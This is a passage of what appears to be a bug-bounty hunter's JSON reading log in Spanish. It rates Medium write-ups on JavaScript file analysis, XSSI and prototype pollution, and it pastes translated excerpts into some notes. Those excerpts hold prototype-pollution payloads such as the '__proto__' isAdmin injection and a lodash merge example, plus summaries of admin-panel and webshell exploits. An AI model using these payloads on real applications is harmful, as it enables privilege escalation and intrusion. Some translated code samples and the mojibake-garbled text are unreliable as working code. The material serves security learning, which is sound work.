Dependiendo de los permisos de la aplicaci√≥n comprometida, los atacantes podr√≠an aprovechar la vulnerabilidad de inyecci√≥n de plantillas para leer archivos confidenciales, ejecutar c√≥digo o aumentar sus privilegios en el sistema. Por ejemplo, a continuaci√≥n se muestra un uso inseguro de una plantilla de Angular que permite a los atacantes inyectar c√≥digo mediante hashes de URL:\n\n\nNunca debe concatenar directamente la informaci√≥n proporcionada por el usuario en las plantillas. En su lugar, utilice el mecanismo de sustituci√≥n integrado del motor de plantillas para integrar de forma segura la informaci√≥n din√°mica:\n\n\nObtenga m√°s informaci√≥n sobre c√≥mo funciona la inyecci√≥n de plantillas y c√≥mo prevenirlas en Angular y React .\n\nLl√©vame de nuevo a la cima.\n\nInclusi√≥n de secuencias de comandos entre sitios\nLos ataques de inclusi√≥n de scripts entre sitios, tambi√©n conocidos como XSSI, ocurren cuando un sitio malicioso incluye JavaScript del sitio web de la v√≠ctima para extraer informaci√≥n confidencial del script.\n\nLa pol√≠tica del mismo origen (SOP) suele controlar el acceso a datos entre or√≠genes. Sin embargo, la SOP no limita el c√≥digo JavaScript, y la <script>etiqueta HTML puede cargar c√≥digo JavaScript desde cualquier origen. Esta es una funci√≥n extremadamente pr√°ctica que permite reutilizar archivos JavaScript en diferentes dominios. Sin embargo, esta funci√≥n tambi√©n supone un riesgo de seguridad: los atacantes podr√≠an robar datos escritos en archivos JavaScript cargando los archivos JS de sus v√≠ctimas.\n\nPor ejemplo, imagine que un sitio web almacena y transporta datos confidenciales de usuarios conectados mediante archivos JavaScript. Si un usuario visita un sitio malicioso en el mismo navegador, este puede importar ese archivo JavaScript y acceder a informaci√≥n confidencial asociada a la sesi√≥n del usuario, todo gracias a las cookies del usuario almacenadas en el navegador. Vea un ejemplo de esta vulnerabilidad y aprenda a prevenirlas en Angular y React .\n\nPara evitar ataques XSSI, no transporte datos confidenciales en archivos JavaScript. A continuaci√≥n, se muestra un ejemplo de c√≥mo cargar de forma segura un token de API en Angular usando archivos JSON (que est√°n limitados por el procedimiento operativo est√°ndar):",
      "editedTs": 1761652985912,
      "status": "buen"
    },
    {
      "id": "kt72xjd",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://anontriager.medium.com/javascript-recon-efd981a85cfc",
      "note": "depende mucho de las tools pero bueno ya lo dijo el mismo en fin basico para mi.",
      "editedTs": 1761653103977,
      "status": "monton"
    },
    {
      "id": "h214ely",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://medium.com/techiepedia/javascript-code-review-guide-for-bug-bounty-hunters-c95a8aa7037a",
      "note": "repo de reglas regex algo basico para mi gusto pero validar con regex101 50 aprox no mucho mas que mirar",
      "editedTs": 1761653355219,
      "status": "regular"
    },
    {
      "id": "hb8zs5y",
      "title": "Nuevo informe",
      "payload": "https://infosecwriteups.com/finding-an-api-key-in-a-js-file-in-the-comments-67b30af1d451",
      "note": "nada interesante.",
      "editedTs": 1761653458404,
      "status": "monton"
    },
    {
      "id": "qloq0zn",
      "title": "Nuevo informe",
      "payload": "https://medium.com/@mohammed0x04/how-i-found-two-api-vulnerabilities-using-website-source-code-6c4b0dc54d6f",
      "note": "y bueno nada che.",
      "editedTs": 1761653615965,
      "status": "monton"
    },
    {
      "id": "ldhy9fh",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://mikekitckchan.medium.com/a-brief-introduction-to-prototype-pollution-b154c23b40c5",
      "note": "¬øQu√© es Prototipo?\nEl prototipo define la estructura y las propiedades de un objeto en Javascript. Entonces, ¬øqu√© es un objeto? En Javascript, podemos pensar en un objeto como un conjunto de pares de claves. Cada par de claves se denomina propiedad. Por ejemplo, si queremos crear un objeto llamado Usuario con dos propiedades: nombre de usuario y contrase√±a, podemos escribir un c√≥digo simple como el siguiente:\n\n\nfunci√≥n Usuario(nombre de usuario, contrase√±a){ \nthis.username=nombre de usuario; \nthis.password=contrase√±a; \n}\nLuego, para crear un nuevo usuario, simplemente se puede hacer siguiendo el siguiente c√≥digo:\n\n\nvar usuarioA = nuevo Usuario(‚ÄúJuan‚Äù, ‚Äú12345678‚Äù);\nconsole.log(‚ÄúSe crea el usuario ‚Äú+userA.username + ‚Äú‚Äù); //salida: Se crea el usuario John\nEntonces, se crea un objeto usuarioA con el nombre de usuario establecido como John y la contrase√±a establecida como 12345678. Estas propiedades se heredan del prototipo del usuario.\n\nPropiedad del prototipo\nUna propiedad de prototipo permite al usuario modificar la estructura o propiedad del prototipo. Por ejemplo, si queremos crear una funci√≥n para que el usuario cambie su contrase√±a, podemos crear una funci√≥n como la siguiente:\n\nCopiar\n\nUser.prototype.change_password = function(var new_pw){\nreturn this.password=new_pw;\n}\nuserA.change_password(\"1234\");\nconsole.log(\"User \"+userA.name+\" password now is \"+userA.password; //User John passowrd now is 1234\nContaminaci√≥n prototipo\nTomando el mismo ejemplo, si creamos el usuarioB como se muestra a continuaci√≥n:\n\nCopiar\nvar userB = new User(\"Billy\", \"abcd\");\nConsiderando que escribimos otra l√≠nea de c√≥digo a continuaci√≥n:\n\nCopiar\nuserB.constructor.prototype.is_admin = \"yes\";\nSeg√∫n el c√≥digo anterior, constructor se refiere a la funci√≥n que cre√≥ al usuario B (es decir, Usuario). Por lo tanto, es exactamente igual que User.prototype.is_admin=\"yes\". Como este cambio se aplica al prototipo del usuario, modifica todos los objetos creados por el usuario, incluido el usuario A. Por lo tanto, si imprimimos la propiedad is_admin del usuario A, descubriremos que tambi√©n ha cambiado al usuario A:\n\nCopiar\nconsole.log(userA.is_admin); //yes\nDe manera similar, constructor.prototype tambi√©n se puede presentar como __proto__ como se muestra a continuaci√≥n:\n\nCopiar\nuserB.__proto__.is_admin = \"yes\";\nContaminaci√≥n del prototipo en la funci√≥n de fusi√≥n\nAhora, considere 2 objetos como se muestra a continuaci√≥n:\n\nCopiar\nvar userA = {\"name\":\"John\" , \"password\":\"123\", \"admin\":\"True\"};\nvar userB = {\"name\":\"Billy\", \"password\":\"234\"};\nAhora, escribamos una funci√≥n para fusionar estos 2 objetos:\n\nCopiar\nconst isObject = obj => obj && obj.constructor && obj.constructor === Object;\nfunction merge(dest, src) {\n for (var attr in src) {\n if (isObject(dest[attr]) && isObject(src[attr])) {\n merge(dest[attr], src[attr]);\n } else {\n dest[attr] = src[attr];\n }\n }\n return dest\n}\nRepasemos el c√≥digo anterior para ver. En √©l, creamos una variable llamada isObject, que es simplemente un booleano, para comprobar si la entrada es un objeto. Luego, la funci√≥n de fusi√≥n toma dos entradas (dest y src) y las pasa a un bucle. El bucle recorrer√° todos sus atributos y los copiar√° de src a dest. B√°sicamente, fusiona dos objetos en uno. Si ejecutamos el siguiente c√≥digo:\n\nCopiar\n\nvar c=merge(userA, userB);\nconsole.log(c); //{name:\"Billy\",password:\"234\",admin:\"True\"}\nAhora, si agregamos el siguiente c√≥digo:\n\nCopiar\nvar userC = {};\nvar userD = JSON.parse('{\"__proto__\":{\"admin\":\"True\"}}');\nvar c=merge(userC, userD);\nconsole.log(userC.admin);\nPuedes ver que el c√≥digo anterior puede cambiar cada usuario a administrador, incluso si el usuario D no es administrador.\n\nLa contaminaci√≥n de prototipos es una vulnerabilidad bastante peligrosa y com√∫n en las aplicaciones Javascript. En un pr√≥ximo art√≠culo, analizaremos casos reales de contaminaci√≥n de prototipos.",
      "editedTs": 1761653699571,
      "status": "buen"
    },
    {
      "id": "qlvf9o7",
      "title": "Nuevo informe",
      "payload": "https://medium.com/@gheeX/exposing-open-redirect-vulnerabilities-javascript-file-analysis-in-http-history-burp-suite-c64bd1c93c54",
      "note": "duplicado analisis js para open redirect .",
      "editedTs": 1761653923424,
      "status": "regular"
    },
    {
      "id": "3m019l3",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://infosecwriteups.com/electron-js-application-penetration-testing-b0809af324f6",
      "note": "anilisis de js pero antes de hacer reversing a la aplicacion de escritorio de eletron interesante.",
      "editedTs": 1761654114542,
      "status": "buen"
    },
    {
      "id": "rinvreu",
      "title": "prototype pollucion bueno",
      "payload": "https://infosecwriteups.com/prototype-pollution-how-a-javascript-quirk-can-lead-to-complete-application-takeover-9adb5e4f6b6b",
      "note": "C√≥mo funciona la contaminaci√≥n protot√≠pica\nLa contaminaci√≥n de prototipos suele ocurrir mediante objetos profundamente anidados o funciones de fusi√≥n de objetos , donde una aplicaci√≥n gestiona incorrectamente la entrada del usuario. Si un atacante logra pasar informaci√≥n maliciosa a una funci√≥n que fusiona o extiende objetos, puede modificar el prototipo global del objeto.\n\nAs√≠ es como funciona un ataque t√≠pico:\n\nApunta a una funci√≥n vulnerable : La contaminaci√≥n de prototipos suele surgir en c√≥digo que utiliza bibliotecas o m√©todos para fusionar objetos, como la funci√≥n lodashde _.merge()o jQuery extend(). Estas funciones pueden tomar la entrada del usuario y fusionarla con objetos existentes.\nInyecci√≥n de entrada maliciosa : El atacante inyecta informaci√≥n que hace referencia a la cadena de prototipos. Por ejemplo, al enviar la carga √∫til {\"__proto__\": {\"isAdmin\": true}}, puede modificar el objeto prototipo.\nAprovechar la contaminaci√≥n : una vez contaminado el prototipo, el atacante puede aprovechar el comportamiento modificado para aumentar privilegios, alterar la l√≥gica de la aplicaci√≥n o activar omisiones de seguridad.\nEjemplo de prototipo de ataque de contaminaci√≥n\nConsidere una aplicaci√≥n que fusiona la entrada del usuario en su objeto de configuraci√≥n utilizando una funci√≥n de biblioteca:\n\nfunci√≥n mergeSettings(userInput) { \n  Object.assign(configuraci√≥n, userInput); \n}\nmergeSettings({ \"__proto__\": { \"isAdmin\": verdadero } });\nDespu√©s de ejecutar este c√≥digo, el objeto prototipo global ( Object.prototype) se contamina y cualquier objeto ahora tendr√° una isAdminpropiedad:\n\ndejar usuario = {}; \nconsola . log (usuario. isAdmin );   // verdadero\nEn una aplicaci√≥n del mundo real, esto podr√≠a conducir a una escalada de privilegios, donde un atacante sin privilegios administrativos podr√≠a eludir los controles de acceso.\n\nT√©cnicas avanzadas de explotaci√≥n de la contaminaci√≥n de prototipos\nM√°s all√° de la simple inyecci√≥n de propiedades, la contaminaci√≥n de prototipos puede conducir a ataques m√°s sofisticados:\n\n1. Ejecuci√≥n de c√≥digo mediante contaminaci√≥n de prototipos\nEn algunos casos, la contaminaci√≥n de prototipos puede provocar la ejecuci√≥n remota de c√≥digo (RCE) . Esto ocurre cuando las propiedades contaminadas se utilizan posteriormente para controlar el comportamiento de las funciones o los valores que devuelven. Al inyectar valores espec√≠ficos en los prototipos, los atacantes pueden controlar el flujo de la aplicaci√≥n, lo que podr√≠a provocar la ejecuci√≥n de c√≥digo arbitrario.\n\n\nPor ejemplo, si una aplicaci√≥n eval√∫a posteriormente propiedades controladas por el usuario dentro de una funci√≥n vulnerable, el atacante podr√≠a desencadenar comportamientos peligrosos.\n\n2. Ataques de denegaci√≥n de servicio (DoS)\nLa contaminaci√≥n de prototipos tambi√©n puede provocar el colapso de una aplicaci√≥n o servidor al contaminar el prototipo con objetos grandes o circulares. Esto genera agotamiento de memoria o bucles infinitos que dejan el sistema inoperante. Por ejemplo, inyectar objetos profundamente anidados en el prototipo podr√≠a causar un uso excesivo de memoria:\n\ndeje que la carga √∫til = { \"__proto__\" : { \"anidado\" : { \"nivel1\" : { \"nivel2\" : { \"nivel3\" : {...}}}}}};\n3. Encadenamiento con otras vulnerabilidades\nEn aplicaciones web complejas, la contaminaci√≥n de prototipos puede combinarse con otras vulnerabilidades para aumentar su impacto. Por ejemplo, si un atacante puede inyectar scripts maliciosos mediante secuencias de comandos entre sitios (XSS) o modificar las respuestas de la API mediante controles de acceso deficientes, la contaminaci√≥n de prototipos puede utilizarse para escalar el ataque o mantener el comportamiento malicioso en varias sesiones.\n\nEjemplo real de contaminaci√≥n protot√≠pica\nSe descubri√≥ un caso notable de contaminaci√≥n de prototipos en lodash , una popular biblioteca de utilidades de JavaScript. La vulnerabilidad exist√≠a en sus funciones _.defaultsDeepy _.merge, lo que permit√≠a la fusi√≥n de objetos, incluyendo la entrada del usuario, sin filtrar adecuadamente las propiedades del prototipo. Los atacantes podr√≠an crear una carga √∫til maliciosa:\n\n_ .merge ({}, JSON.parse ( ' {\"__proto__\": {\"contaminado\": \"s√≠\"}}' ));\nEsto contamin√≥ el global Object.prototype, lo que gener√≥ problemas de seguridad para las aplicaciones que utilizan versiones vulnerables de lodash. Esta vulnerabilidad fue finalmente corregida, pero puso de relieve el riesgo generalizado que la contaminaci√≥n de prototipos supone para las aplicaciones JavaScript.\n\nPrevenci√≥n de la contaminaci√≥n por prototipos\nPara evitar la contaminaci√≥n de prototipos se requiere una validaci√≥n de entrada minuciosa y un manejo seguro de los objetos dentro del c√≥digo JavaScript. A continuaci√≥n, se presentan algunas estrategias clave:\n\nEvitar la modificaci√≥n directa de __proto__, constructor, yprototype : Bloquear o sanear la entrada del usuario que haga referencia a las propiedades __proto__, constructoro prototype. Por ejemplo:\nif (userInput.hasOwnProperty('__proto__')) { throw new Error(\"Prototype pollution detected!\"); }\nUse bibliotecas seguras : Aseg√∫rese de que todas las bibliotecas o el c√≥digo de terceros que utilice est√©n actualizados y parcheados contra vulnerabilidades de contaminaci√≥n de prototipos. Compruebe si existen vulnerabilidades conocidas en bibliotecas como lodash o jQuery.\nUtilice Object.create() para la creaci√≥n de instancias de objetos : al crear objetos nuevos, utilice Object.create(null)para crear objetos sin prototipos, evitando que la herencia de prototipos altere la l√≥gica de la aplicaci√≥n.\nImplementar congelaci√≥n profunda de objetos : bloquee objetos usando m√©todos como Object.freeze()o Object.seal()para evitar modificaciones adicionales:\nObject.freeze(safeObject);\nRealizar validaci√≥n de entrada : siempre valide y desinfecte la entrada del usuario para asegurarse de que no incluya propiedades peligrosas que puedan modificar el comportamiento de la aplicaci√≥n.\nAl final‚Ä¶\nLa contaminaci√≥n de prototipos es una vulnerabilidad potente que explota el sistema de herencia de objetos inherente a JavaScript. Al inyectar propiedades en los prototipos de objetos, los atacantes pueden manipular el comportamiento de las aplicaciones, eludir los controles de seguridad y potencialmente escalar el ataque a consecuencias m√°s graves, como la ejecuci√≥n de c√≥digo o la denegaci√≥n de servicio.\n\nDado el uso generalizado de JavaScript en las aplicaciones web modernas, comprender y defenderse contra la contaminaci√≥n de prototipos es crucial tanto para desarrolladores como para profesionales de la seguridad. Mediante una validaci√≥n de entrada estricta, la protecci√≥n de bibliotecas y la gesti√≥n adecuada de la creaci√≥n de objetos, puede proteger sus aplicaciones de este complejo y peligroso vector de ataque.",
      "editedTs": 1761654330516,
      "status": "muybueno"
    },
    {
      "id": "r6s64vn",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://bevijaygupta.medium.com/hunting-javascript-files-for-bug-hunters-7355df2215ec",
      "note": "mhe nada interesante.",
      "editedTs": 1761654430426,
      "status": "monton"
    },
    {
      "id": "slo6nos",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://medium.com/@codingbolt.in/reflected-xss-into-a-javascript-string-with-angle-brackets-and-double-quotes-html-encoded-and-e1ad9b482189",
      "note": "interesante con comillas simples o doble / pudo escapar cerrar la codificacion para lograr xss.",
      "editedTs": 1761654694700,
      "status": "buen"
    },
    {
      "id": "79k7djx",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://medium.com/@hrofficial62/analyzing-javascript-files-to-find-bugs-7b277d1df435",
      "note": "nada",
      "editedTs": 1761654830987,
      "status": "monton"
    },
    {
      "id": "leb32u7",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://rudrasarkar.medium.com/digging-into-javascript-to-find-the-gem-688c06c38db7",
      "note": "Interesante resulta que el sitio web mandaba todo cifrado resulta que la logica de eso dejaron en front lo encontro y bueno lo aplico y logro obtener una clave de AWS S3.",
      "editedTs": 1761655083492,
      "status": "buen"
    },
    {
      "id": "j4t5qfg",
      "title": "prototype",
      "payload": "https://medium.com/@mayank_prajapati/prototype-pollution-the-hidden-danger-in-javascript-c8b17002e8da",
      "note": "Impacto de la contaminaci√≥n de los prototiposüèπ\nEl atacante puede introducir bucles infinitos en el c√≥digo que provocar√≠an un gran consumo de recursos.\nLa contaminaci√≥n del prototipo del lado del cliente puede convertirse en la causa de XSS DOM, mientras que en el lado del servidor tambi√©n puede causar RCE.\nCorrompe el comportamiento del objeto, lo que puede provocar una exposici√≥n inesperada de datos confidenciales o eludir el mecanismo de seguridad implementado.",
      "editedTs": 1761655166199,
      "status": "buen"
    },
    {
      "id": "xeakmho",
      "title": "Nuevo informe",
      "payload": "https://blog.lubi.cz/using-bbrf-for-tracking-javascript-files-76901a03939f",
      "note": "nada interesante.",
      "editedTs": 1761655260901,
      "status": "monton"
    },
    {
      "id": "9oif97k",
      "title": "Nuevo informe",
      "payload": "https://blog.stackademic.com/hunting-javascript-file-for-bug-hunters-e8b278a1306a",
      "note": "nada interesante algunas tools etc.",
      "editedTs": 1761655378872,
      "status": "regular"
    },
    {
      "id": "ipdibra",
      "title": "Nuevo informe",
      "payload": "https://jeetpal2007.medium.com/easiest-way-to-find-hidden-api-from-js-files-ce115a4ad1af",
      "note": "nada",
      "editedTs": 1761655432118,
      "status": "monton"
    },
    {
      "id": "4xw6lyk",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://medium.com/@Land2Cyber/javascript-juggernauts-tackling-security-challenges-in-client-side-code-01e426864a26",
      "note": "nada interesante.",
      "editedTs": 1761655541136,
      "status": "monton"
    },
    {
      "id": "vvnc7bz",
      "title": "Nuevo informe",
      "payload": "https://anasbetis023.medium.com/bugs-js-a-closer-look-at-javascript-for-successful-bug-hunting-fddb0d796498",
      "note": "nada",
      "editedTs": 1761655613942,
      "status": "monton"
    },
    {
      "id": "noqmr8n",
      "title": "jsluice",
      "payload": "https://freedium.cfd/https://lopseg.medium.com/navigating-tree-sitter-queries-with-jsluice-for-javascript-file-analysis-061b7cb4ea9d",
      "note": "Este maldito informe me ayudo a comprender realmente la diferencia entre usar ripgrep con diccionario y reglas regex vs jsluice y el lenjuage de consulta etc super bueno lo potenciare con unas 70 cateogiras y unas 150 reglas regex etc muy bueno para analisis mas completo y detalle.\n\n\nConcepto base\nHerramienta\tQu√© hace realmente\nripgrep + regex\tBusca textos que coincidan con un patr√≥n (sin entender el lenguaje). Opera sobre bytes.\njsluice / Tree-Sitter\t‚ÄúParsea‚Äù el c√≥digo con un √°rbol sint√°ctico (AST) real. Entiende qu√© es funci√≥n, variable, string, objeto, etc. Opera sobre estructura gramatical, no sobre texto plano.\n2. Diferencia pr√°ctica\n\nripgrep/regex:\n\nEncuentra ‚Äúfunction‚Äù o ‚Äúconst‚Äù, pero no sabe si est√° en un comentario o en una string.\n\nSi el c√≥digo est√° minificado, comprimido o con saltos raros, se rompe.\n\nEjemplo: te devuelve 100 falsos positivos si hay ‚Äúfunction‚Äù dentro de comentarios o docstrings.\n\njsluice/Tree-Sitter:\n\nLee el parse tree.\nEjemplo: (function_declaration name: (identifier) @fn) literalmente te devuelve solo los nombres de funci√≥n definidos, sin importar el formato, espaciado o minificaci√≥n.\n\nEntiende contextos, evita falsos positivos.\n\nFunciona igual con async, export, class, arrow functions, etc.\n\nPuede extraer relaciones: ‚Äútodas las funciones que llaman a fetch‚Äù o ‚Äútodas las asignaciones a window.location‚Äù.\n\n3. Cu√°ndo usar cada uno\n\nRipgrep + regex:\n\nEscaneo masivo r√°pido de keywords sospechosas (tokens, endpoints, secretos).\n\nPre-filtrado en millones de archivos (tu pipeline cl√°sico).\n\nContexto: ‚Äúnecesito 10 posibles candidatos en segundos‚Äù.\n\nTree-Sitter / jsluice:\n\nAn√°lisis estructural.\nIdeal cuando quer√©s entender qu√© hace el c√≥digo, no solo qu√© texto contiene.\nEjemplos reales:\n\nMapear llamadas a fetch, axios, XMLHttpRequest.\n\nIdentificar todas las funciones que manipulan document.cookie.\n\nEncontrar d√≥nde se usan APIs cr√≠ticas (localStorage, eval, innerHTML, etc.).\n\nExtraer rutas o nombres de handlers sin falsos positivos.",
      "editedTs": 1761656251842,
      "status": "excelente"
    },
    {
      "id": "gjomdlg",
      "title": "Nuevo informe",
      "payload": "https://satyasai1460.medium.com/sensitive-information-disclosure-in-js-leads-to-admin-panel-access-6e26b177e3b4",
      "note": "el informe mas corto de js analsis jaja buscar control f admin contrase√±a la probo y entro.",
      "editedTs": 1761656422039,
      "status": "regular"
    },
    {
      "id": "k1fczti",
      "title": "Nuevo informe",
      "payload": "https://medium.com/@abdelrahmanyousef33/how-i-discovered-an-exposed-api-access-token-in-a-javascript-file-uncovering-sensitive-company-f14524f2123e",
      "note": "comprendi con este informe que los puntos finales puede aceptar varios metodos http si no estan definidos.",
      "editedTs": 1761656653804,
      "status": "buen"
    },
    {
      "id": "rluqldt",
      "title": "Nuevo informe",
      "payload": "https://medium.com/@riza/time-traveling-for-money-discovering-secrets-in-vintage-javascript-files-7deece114b93",
      "note": "nada una tool de un loco pero nada interesante.",
      "editedTs": 1761656754972,
      "status": "monton"
    },
    {
      "id": "xyz97k1",
      "title": "Nuevo informe",
      "payload": "https://medium.com/@omarahmed_13016/%D9%90account-takeover-hidden-in-javascript-files-plus-some-extra-work-my-type-a2eb8208f049",
      "note": "Si encuentra un UUID de usuario filtrado en alg√∫n lugar, busque los puntos finales que lo utilizan y use su b√∫squeda Burp para facilitar el proceso.",
      "editedTs": 1761656948782,
      "status": "muybueno"
    },
    {
      "id": "htduzmk",
      "title": "analisis malware js",
      "payload": "https://medium.com/@rajeevranjancom/analyze-javascript-malware-966f79abf55f",
      "note": "super interesante y complejo malware de js interesante el proceso incial como termina.",
      "editedTs": 1761657208615,
      "status": "excelente"
    },
    {
      "id": "c7boxz4",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://northstar1.medium.com/analyzing-javascript-files-part-2-4b9b13c474c1",
      "note": "nada interesante.",
      "editedTs": 1761657243110,
      "status": "monton"
    },
    {
      "id": "5j63xz7",
      "title": "Nuevo informe",
      "payload": "https://medium.com/@ratnadip1998/how-to-find-access-admin-panel-by-digging-into-js-files-282d89391a2d",
      "note": "ip de origen admin admin en ambos campos panel etc. alto bounty.",
      "editedTs": 1761657403735,
      "status": "regular"
    },
    {
      "id": "nnhz13q",
      "title": "js a rce",
      "payload": "https://melotover.medium.com/can-analyzing-javascript-files-lead-to-remote-code-execution-f24112f1aa1f",
      "note": "tremendo reversing de js pudo subir un webshell encima 2 jaja super bueno explicado y algo complejo si no tenes el conocimientos suficiente para poder identificar algo asi en js y demas, esta bueno.",
      "editedTs": 1761657799319,
      "status": "excelente"
    },
    {
      "id": "qvx19qi",
      "title": "Nuevo informe",
      "payload": "https://zhenwarx.medium.com/how-we-hacked-bypassed-admin-panel-just-by-js-file-eaa773b5cdb4",
      "note": "esta bueno como es el pensamiento de los hunter ante un sitio web solo un panel interesante analisis de js siempre te da pan solo tienes que comertelo XD.",
      "editedTs": 1761658027337,
      "status": "muybueno"
    },
    {
      "id": "vd7n5or",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://javascript.plainenglish.io/javascript-security-weak-type-bypass-b3c0895b6e5f",
      "note": "eludir los controles de seguridad de JavaScript explotando su caracter√≠stica de tipado d√©bil.\n\ncambiando el valor === etc mirar el informe.",
      "editedTs": 1761658184683,
      "status": "buen"
    },
    {
      "id": "4zjti8o",
      "title": "Nuevo informe",
      "payload": "https://mturhanlar.medium.com/javascript-101-comparison-conditions-04-f4d136652248",
      "note": "js Comparaci√≥n y condiciones, interesante\n\nComparaci√≥n\nEn ese texto, explicaremos muchas m√°s comparaciones. Como en todos los lenguajes de programaci√≥n, JavaScript tambi√©n compara dos valores con ==;\n\n10 == 10;\n\nEste valor nos dar√° verdadero. Porque los valores de la izquierda (10) y la derecha (10) son iguales.\n\nLo mismo que las cuerdas;\n\n‚Äúhola‚Äù == ‚Äúhola‚Äù ; nos dar√° verdadero\n\nPero ‚Äúhola‚Äù == ‚ÄúHola‚Äù nos dar√° falso, porque javascript distingue entre may√∫sculas y min√∫sculas.\n\nEn nuestro segundo texto, hablamos del polimorfismo. Ahora veremos algunos ejemplos de este problema.\n\n10 == ‚Äú10‚Äù ; ¬ødeber√≠a dar falso o verdadero?\n\nEs verdadero porque hay polimorfismo y las cadenas tienen precedencia, por lo que JavaScript toma el valor entero izquierdo y cambia su tipo de dato y lo compara con el valor de la cadena derecha.",
      "editedTs": 1761658291282,
      "status": "buen"
    },
    {
      "id": "pw5beek",
      "title": "Nuevo informe",
      "payload": "https://mturhanlar.medium.com/javascript-101-embedding-objects-arrays-03-e91906ecddcc",
      "note": "js  Incrustar objetos y matrices",
      "editedTs": 1761658352162,
      "status": "buen"
    },
    {
      "id": "c5e03r0",
      "title": "Nuevo informe",
      "payload": "https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746",
      "note": "B√∫squeda de contaminaci√≥n de prototipos del lado del cliente\nBueno para este tipo de caza vamos a utilizar Chrome/Chromium ya que cuentan con las Developer Tools que seguro son m√°s compatibles para la depuraci√≥n.\n\nLa explotaci√≥n comienza determinando si el sitio web es vulnerable a la contaminaci√≥n del prototipo del lado del cliente. Usaremos ppmap , que probar√° autom√°ticamente diferentes cargas √∫tiles para contaminar las variables en el contexto global. Despu√©s de descargar la herramienta en su equipo local, simplemente ejec√∫tela en el sitio web de destino con el siguiente comando:",
      "editedTs": 1761658458188,
      "status": "buen"
    },
    {
      "id": "wi2xqyh",
      "title": "prototype pollution completo",
      "payload": "https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2",
      "note": "Este art√≠culo te ayudar√° a profundizar en el tema de la contaminaci√≥n de prototipos. En las secciones \"Caracter√≠sticas de JavaScript\" y \"Qu√© es la contaminaci√≥n de prototipos\", aprender√°s c√≥mo funcionan los objetos y prototipos de JavaScript y c√≥mo sus caracter√≠sticas espec√≠ficas pueden generar vulnerabilidades. En las secciones \" Contaminaci√≥n de prototipos del lado del cliente\" y \"Contaminaci√≥n de prototipos del lado del servidor\", aprender√°s a buscar y explotar esta vulnerabilidad en casos reales. Finalmente, aprender√°s a proteger tus aplicaciones y por qu√© el m√©todo de protecci√≥n m√°s com√∫n se puede eludir f√°cilmente.",
      "editedTs": 1761658632312,
      "status": "excelente"
    }
  ]
}